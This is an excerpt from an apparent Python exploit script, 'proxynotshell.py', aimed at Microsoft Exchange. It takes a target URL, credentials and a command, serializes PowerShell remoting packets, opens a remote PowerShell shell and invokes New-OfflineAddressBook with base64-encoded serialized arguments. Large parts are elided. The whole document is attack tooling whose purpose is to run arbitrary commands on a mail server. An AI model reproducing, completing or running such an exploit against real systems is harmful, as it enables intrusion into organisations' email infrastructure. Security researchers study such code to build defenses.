...
if(len(sys.argv) < 5):
	print("Use: proxynotshell.py <URL> <username> <password> <command>")
	exit()
...
class BasePacket:
	...
	def serialize(self):
		Blob = b''.join([struct.pack('I', self.Destination), struct.pack('I', self.MessageType), self.RPID.bytes_le, self.PID.bytes_le, self.Data.encode()])
		BlobLength = len(Blob)
		output = b''.join([struct.pack('>Q', self.ObjectId), struct.pack('>Q', self.FragmentId), self.Flags.encode(), struct.pack('>I', BlobLength), Blob ])
		return output
...
def create_powershell_shell(SessionId, RPID):
	...
	creationXml = CreationXML(sessionCapability, initRunspacPool).serialize().decode()
...
def run_cmdlet_new_offlineaddressbook(SessionId, RPID, ShellId):
	...
	command_arguments = base64.b64encode(c.serialize()).decode()
